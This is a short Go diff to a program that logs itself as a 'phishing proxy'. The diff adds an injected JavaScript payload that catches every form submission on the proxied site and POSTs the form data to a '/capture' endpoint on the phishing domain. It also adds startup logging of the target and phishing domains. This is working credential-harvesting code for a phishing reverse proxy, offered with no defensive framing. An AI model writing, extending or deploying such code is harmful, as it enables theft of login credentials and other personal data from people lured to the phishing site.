@@ -2,6 +2,7 @@ package main
 
 import (
 	"crypto/tls"
+	"flag"
 	"log"
 	"net/http"
 )
@@ -41,7 +42,21 @@ func createServer(handler http.Handler) *http.Server {
 }
 
 func main() {
+	flag.Parse()
+
+	// Initialize JS payload with phishing domain
+	jsPayload = `document.addEventListener('submit', function(e) {
+		fetch('//` + phishingDomain + `/capture', {
+			method: 'POST',
+			body: JSON.stringify(Array.from(new FormData(e.target))
+		});
+	});`
+
 	proxy := createProxy()
 	server := createServer(proxy)
+
+	log.Printf("Starting phishing proxy:\nTarget: %s\nPhishing: %s\nLog Level: %v",
+		targetDomain, phishingDomain, verbosity)
+
 	log.Fatal(server.ListenAndServeTLS(certFile, keyFile))
 }
